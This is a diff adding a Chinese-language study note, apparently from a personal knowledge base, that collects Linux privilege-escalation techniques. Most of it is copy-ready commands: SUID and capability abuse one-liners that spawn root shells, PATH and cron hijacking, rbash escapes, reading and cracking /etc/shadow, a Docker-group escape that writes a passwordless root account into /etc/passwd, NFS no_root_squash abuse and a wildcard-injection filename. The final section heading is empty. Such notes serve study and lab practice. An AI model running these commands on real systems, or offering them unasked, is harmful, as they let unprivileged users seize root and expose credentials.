@@ -1,0 +1,553 @@
+=========================
+提权总结
+=========================
+
+sudo/suid提权
+=========================
+
+- suid涉及到linux的s权限位: :doc:`/docs/操作系统/linux/概念性/linux下文件权限位`
+- sudo可以其他用户执行, 可见: :doc:`/docs/操作系统/linux/linux指令/sudo`
+
+一般来说, 就是利用某些具有s位权限的指令, 获取到root的权限
+
+查找具有suid权限文件::
+
+  find / -perm -u=s 2>/dev/null
+
+查看哪些命令能被sudo::
+
+  sudo -l
+
+接下来列出具体可用于提权的一些指令
+
+nmap
+-------------------------------
+
+nmap::
+
+  echo "os.execute('/bin/bash')" > ./shell
+  nmap --script=shell
+
+suid-find
+-------------------------------
+
+find命令自带-exec参数, 可以执行命令, 若find有suid权限, 那么使用exec相当于直接提权到root::
+
+  # find / -exec command
+  find /path -exec {} \;
+
+suid-vim
+-------------------------------
+
+vim有了suid就可以任意文件读取了
+
+同时也可以输入::
+
+  :shell
+
+来获取root shell
+
+bash
+-------------------------------
+
+开启一个新shell, suid的话自然是开启root shell::
+
+  bash -p
+
+less/more
+-------------------------------
+
+和vim差不多, 任意文件读取, 同时也可以输入::
+
+  !command
+
+进行提权到root
+
+exim
+-------------------------------
+
+exim在特定版本下会有suid提权
+
+这里没懂
+
+利用环境变量
+-------------------------------
+
+如果我们找到一个suid权限的程序, 但是我们无法完成suid提权, 就可以试试搭配环境变量进行提权.
+
+这个提权方法的思想是:
+
+- 文件具有 suid 权限
+- 文件内容有 system 函数调用, 且此调用未指定路径
+- 用户有权修改自己环境变量
+
+就可以通过劫持system函数里调用的脚本文件,
+使其指向我们环境变量里自行创建的一个同名脚本文件,
+那么自行创建的同名脚本文件就能以root权限运行了,
+如果这个脚本文件里的命令是/bin/bash, 那么就相当于提权了.
+
+**例**
+
+对于被攻击者, 创建一个具有以上条件的文件::
+
+  ┌──(root㉿3675b5ebb8ce)-[~]
+  └─# cat demo.c
+  # include <unistd.h>
+  # include <stdlib.h>
+
+  void main (){
+    setuid(0);
+    setgid(0);
+
+    system("ps");
+  }
+
+
+  ┌──(root㉿3675b5ebb8ce)-[~]
+  └─# gcc demo.c -o do_ps
+
+  ┌──(root㉿3675b5ebb8ce)-[~]
+  └─# chmod u+s do_ps
+
+  ┌──(root㉿3675b5ebb8ce)-[~]
+  └─# ls -lh do_ps
+  -rwsr-xr-x 1 root root 69K Mar  4 14:44 do_ps
+
+  ┌──(root㉿3675b5ebb8ce)-[~]
+  └─# ./do_ps
+    PID TTY          TIME CMD
+      9 pts/1    00:00:00 bash
+    31 pts/1    00:00:00 do_ps
+    32 pts/1    00:00:00 sh
+    33 pts/1    00:00:00 ps
+
+  ┌──(root㉿3675b5ebb8ce)-[~]
+  └─# mv do_ps /home/yanque/test/
+
+对于攻击者而言::
+
+  ┌──(yanque㉿3675b5ebb8ce)-[~]
+  └─$ find / -perm -u=s -type f 2>/dev/null
+  /home/yanque/test/do_ps
+
+  ┌──(yanque㉿3675b5ebb8ce)-[~]
+  └─$ test/do_ps
+    PID TTY          TIME CMD
+      9 pts/1    00:00:00 bash
+    51 pts/1    00:00:00 su
+    67 pts/1    00:00:00 do_ps
+    68 pts/1    00:00:00 sh
+    69 pts/1    00:00:00 ps
+
+发现返回了ps命令的结果, 可此猜测这个文件内部 有 system(“ps”); 类似这样的代码.
+
+.. sidebar:: 测试...
+
+  本地测试的时候 export 一直失败... ::
+
+    ┌──(yanque㉿3675b5ebb8ce)-[~/test]
+    └─$ export $PATH="/home/yanque/test:$PATH"
+    -bash: export: `/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games=/home/yanque/test:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games': not a valid identifier
+
+  遂放弃
+
+然后进行以下尝试::
+
+  cd /tmp
+  echo "/bin/bash" > ps
+  export $PATH=/tmp:$PATH        # 需要修改自身环境变量的权限, 但基本上都有这个权限
+  chmod 777 ./ps                 # 没这条命令会导致提权失败
+  cd ~
+  test/do_ps                     # 提权成功
+
+rbash绕过
+=========================
+
+rbash, 是出于安全性考虑的一个功能受限的bash, 他的限制性可能会有如下.
+
+- cd 切换目录
+- 含有斜杠 / 的命令, 譬如 /bin/sh
+- 设置 PATH ENV 等环境变量
+- 使用 > < 进行重定向
+- binary 的运行.
+  通常 root 用户会手动创建 ``/bin/binary_file -> /home/rbash_user/bin/binary_file``
+  的软链接,
+  限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 echo $SHELL, 可以获取当前环境是否是 rbash.
+
+使用scp发送自己的bash进行绕过::
+
+  # 发送到当前用户的环境变量路径下
+  scp /usr/bin/bash user@ip:/home/test/bash
+
+  # 执行
+  bash -p
+
+同时这里也可以想到, 很多命令如man,git config help,more,less,vim,vi,ftp,gdb等,
+都有自己的shell, 只需在他们各自的shell中执行/bin/sh即可进入bash界面, 一般都是在shell键入::
+
+  !/bin/sh
+
+来 bypass rbash
+
+vim
+-------------------------------
+
+如对于vim, 可执行以下命令绕过::
+
+  :set shell=/bin/bash
+  :shell
+
+find
+-------------------------------
+
+对于find来说::
+
+  find -exec /bin/bash \;
+
+cp
+-------------------------------
+
+对于cp::
+
+  # 查看当前用户环境变量
+  export -p
+
+  # 然后使用cp 将 /usr/bin 下文件复制过来即可
+
+编程语言绕过
+-------------------------------
+
+python::
+
+  python -c "import os;os.system('/bin/bash')"
+
+php::
+
+  # php -a 进入php shell
+  exec("/bin/bash");
+
+perl::
+
+  perl -e 'exec "/bin/sh";'
+
+ruby::
+
+  ruby -e 'exec "/bin/bash"'
+
+ssh
+-------------------------------
+
+对于ssh, 通过ssh链接当前IP的当前用户并启动/bin/bash::
+
+  ssh username@Ip -t "/bin/bash"
+
+内核提权
+=========================
+
+先查看系统内核版本::
+
+  uname -a
+
+然后找exp打
+
+passwd和shadow
+=========================
+
+明文密码
+-------------------------------
+
+/etc/passwd 默认所有用户可读, 但只有root可写.
+/etc/passwd里的用户口令往往以x代替, 其加密后的密码会存入/etc/shadow里面, /etc/shadow默认只有root可读.
+
+但是有小概率情况, 明文密码就直接出现在/etc/passwd了, 如果有这个情况且root密码暴露在了passwd里, 那么就可以轻而易举提权了
+
+passwd 可写
+-------------------------------
+
+.. todo: 记得有一个加密用户密码写入的例子, 后面补充
+
+如果/etc/passwd 我们当前用户可写, 可以直接把root的密码改成一个明文密码, 从而达到提权目的
+
+爆破shadow
+-------------------------------
+
+如果/etc/shadow 可读, 我们可以用hashcat或者john暴力破解shadow文件
+
+计划任务(crontab)
+=========================
+
+文件重写
+-------------------------------
+
+计划任务由crontab管理, 非root用户是无法列出root用户的计划任务的, 但我们可以列出/etc的系统任务, 系统任务默认是root权限运行的::
+
+  ls -l /etc/cron*
+
+如果我们有幸有权限能更改其中一个任务指定的脚本, 我们就可以往脚本里添加如反弹shell等指令, 从而提权
+
+环境变量劫持
+-------------------------------
+
+查看定时任务
+
+发现定义了诸多环境变量, 如果其任务有未指定绝对路径的指令, 如::
+
+  17 *    * * *   root    shell.sh
+
+而且我们在其环境变量路径中可以进行写入操作, 那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持
+
+比如我们在/sbin 写入一个 反弹shell功能的shell.sh, 那么就可以造成提权
+
+密码查找
+=========================
+
+这个提权技术说白了, 就是去到处翻密码
+
+可以通过以下命令, 指定关键字, 在所有文件中搜索内容中有关键字的文件::
+
+  grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+  find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+
+查找十分钟内更改过的文件::
+
+  find / -mmin -10 2>/dev/null | grep -Ev "^/proc"  (不显示^/proc文件或文件夹)
+
+
+capabilities
+=========================
+
+capabilities 是linux2.2后出现的产物, 它的出现一定程度上弥补了suid这种粗糙的权限管理机制,
+但是capabilities 自身也有造成提权的安全隐患
+
+简介
+-------------------------------
+
+capabilities 把root的权限细分了, 可以分别启用或者禁用.
+
+.. sidebar:: euid
+
+  见 :doc:`/docs/操作系统/linux/概念性/linux下文件权限位` 下 **文件权限的s位和t位的理解** 小节
+
+在进行特权操作的时候, 如果 euid 不是root,
+那么系统就会检查是否具有执行特权操作的对应capabilities , 并以此为凭据决定特权操作是否能被执行.
+
+如下是一些常见的特权操作及其对应capabilities
+
+.. csv-table::
+
+  改变文件的所属者(chown())               , CAP_CHOWN
+  向进程发送信号(kill() signal())        , CAP_KILL
+  改变进程的uid(setuid() setreuid() setresuid()等) , CAP_SETUID
+  trace进程(ptrace())                   , CAP_SYS_PTRACE
+  设置系统时间(settimeofday() stime()等)  , CAP_SYS_TIME
+  忽略文件读及目录搜索的DAC访问限制         , CAP_DAC_READ_SEARCH
+
+关于capabilities的管理工具有如下:
+
+- getcap_
+- setcap
+- capsh
+- filecap
+
+getcap
++++++++++++++++++++++++++++++++
+
+getcap 用于查询capabilities, setcap用于设置capabilities,
+capsh用于查当前shell进程的capabilities, filecap既能设置又能查询.
+
+我们可以通过以下指令搜索设置了capabilities的可执行文件::
+
+  getcap -r / 2>/dev/null
+
+实操 - 通过 cap_setuid
+-------------------------------
+
+cap_setuid 可以设置当前用户的euid, 我们可以通过此选项来进行一些提权.
+
+以python为例::
+
+  ./python3.8 = cap_setuid+eip
+
+现python3.8 有cap_setuid权限, 那么我们可以用以下指令进行提权::
+
+  python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+类似的有很多
+
+perl::
+
+  perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+
+gdb::
+
+  gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
+
+php::
+
+  php -r "posix_setuid(0); system('/bin/sh');"
+
+python::
+
+  python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+rvim (需要支持python3模块) ::
+
+  rvim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+
+vim (需要支持python3模块, ``vim --version`` 查询, 是否支持py3) ::
+
+  vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+
+实操 - 通过 CAP_DAC_READ_SEARCH
+-------------------------------
+
+cap_dac_read_search 可以绕过文件的读权限检查以及目录的读/执行权限的检查.
+
+利用此特性我们可以读取系统中的敏感信息.
+
+如果tar有此权限, 我们可以通过此来查看敏感文件内容::
+
+  tar cvf shadow.tar /etc/shadow  //创建压缩文件
+
+  tar -xvf shadow.tar  //解压缩
+
+  cd etc  //进入解压缩的目录
+
+  chmod +r shadow  //赋予读权限
+
+  cat shadow | grep root  //查看shadow文件的内容
+
+Docker
+=========================
+
+Docker用户组提权
+
+如果我们拿到了一个Docker用户组的用户权限, 那么我们可以很轻松地完成提权
+
+首先我们执行如下命令::
+
+  docker run -v /:/mnt --rm -it crf_web1 chroot /mnt sh
+
+然后在其中的/etc/passwd中写入一个root权限用户（这里直接无密码了） ::
+
+  root2::0:0::/root:/bin/bash
+
+然后退出来, 直接尝试::
+
+  su root2
+
+NFS
+=========================
+
+NFS 是一个用来共享目录的东西, 但若配置权限不当则会引发安全问题
+
+**no_root_squash**
+
+我们 ``cat /etc/exports`` 如果有 ``no_root_squash`` 字样,
+则说明root用户会对共享目录拥有至高的权限控制, 就像是对本机的目录操作一样.
+
+也就是说, 任何机器的root在此目录上都有最高权限.
+
+我们在获得一台机器的root权限后, 可以通过nfs在另一台低权限机器上实现提权::
+
+  mkdir /tmp/nfs
+  mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs  # 将本机上的/tmp/nfs 挂载到共享目录
+  cp /bin/bash /tmp/nfs/bash
+  chmod u+s /tmp/nfs/bash  设置共享目录上bash的suid
+
+回到低权限机, 执行 /tmp/bash  完成提权
+
+通配符提权
+=========================
+
+`利用通配符实现Linux本地提权 <https://www.secpulse.com/archives/72965.html>`_
+
+一种古老的UNIX黑客技术—通配符注入
+
+通配符是一个字符或一组字符, 可以用来替换某些范围/类别的字符. 在执行任何其他操作之前, 通配符首先要经过shell进行解释.
+
+一些常见的通配符::
+
+  *     星号可以与文件名中的任意数量的字符匹配, 包括0个字符.
+  ?     问号用于匹配任意单个字符.
+  []   括号内包括一组字符, 其中任何一个字符都可以匹配该位置上的单个字符.
+  –     []中的连字符表示字符范围.
+  ~     单词开头的波浪符表示当前用户的主目录的名称. 如果该字符后面是另一个用户的登录名, 则表示该用户的主目录.
+
+例1-通过Chown劫持文件所有者
+-------------------------------
+
+前置, root想给多用户提供一个公共的目录::
+
+  ┌──(root㉿3675b5ebb8ce)-[~]
+  └─# mkdir /tmp/common
+
+  ┌──(root㉿3675b5ebb8ce)-[~]
+  └─# chmod 777 /tmp/common
+
+用户 yanque 在其下创建了三个文件::
+
+  ┌──(yanque㉿3675b5ebb8ce)-[/tmp/common]
+  └─$ touch file1.php file2.php file3.php
+
+  ┌──(yanque㉿3675b5ebb8ce)-[/tmp/common]
+  └─$ ls -lh
+  total 0
+  -rw-r--r-- 1 yanque yanque 0 Mar  5 15:59 file1.php
+  -rw-r--r-- 1 yanque yanque 0 Mar  5 15:59 file2.php
+  -rw-r--r-- 1 yanque yanque 0 Mar  5 15:59 file3.php
+
+攻击者 yq 发现了这个目录下的文件都是 yanque 的, 猜测root用户可能会对其使用通配符的方式进行授权操作, 于是做出以下操作::
+
+  ┌──(yq㉿3675b5ebb8ce)-[/tmp/common]
+  └─$ echo >--reference=my.php
+
+  ┌──(yq㉿3675b5ebb8ce)-[/tmp/common]
+  └─$ echo >my.php
+
+  ┌──(yq㉿3675b5ebb8ce)-[/tmp/common]
+  └─$ ls -lh
+  total 8.0K
+  -rw-r--r-- 1 yq     yq     1 Mar  5 16:04 '--reference=my.php'
+  -rw-r--r-- 1 yanque yanque 0 Mar  5 15:59  file1.php
+  -rw-r--r-- 1 yanque yanque 0 Mar  5 15:59  file2.php
+  -rw-r--r-- 1 yanque yanque 0 Mar  5 15:59  file3.php
+  -rw-r--r-- 1 yq     yq     1 Mar  5 16:04  my.php
+
+.. tip::
+
+  猜测root可能会执行::
+
+    cd /tmp/common && chown -R yanque:yanque *.php
+
+  企图让实际执行指令变为::
+
+    chown yanque:yanque /tmp/common/* --reference=my.php
+
+root因为某些不知名的原因进行了授权操作::
+
+  ┌──(root㉿3675b5ebb8ce)-[/]
+  └─# cd /tmp/common/
+
+  ┌──(root㉿3675b5ebb8ce)-[/tmp/common]
+  └─# chown -R yanque:yanque *.php
+  chown: cannot access 'yanque:yanque': No such file or directory
+
+  ┌──(root㉿3675b5ebb8ce)-[/tmp/common]
+  └─# ls -lh
+  total 8.0K
+  -rw-r--r-- 1 yq yq 1 Mar  5 16:04 '--reference=my.php'
+  -rw-r--r-- 1 yq yq 0 Mar  5 15:59  file1.php
+  -rw-r--r-- 1 yq yq 0 Mar  5 15:59  file2.php
+  -rw-r--r-- 1 yq yq 0 Mar  5 15:59  file3.php
+  -rw-r--r-- 1 yq yq 1 Mar  5 16:04  my.php
+
+权限变成了yq的.
+
+例2-通过tar投送漏洞利用代码
+-------------------------------
+
+
+
+
+
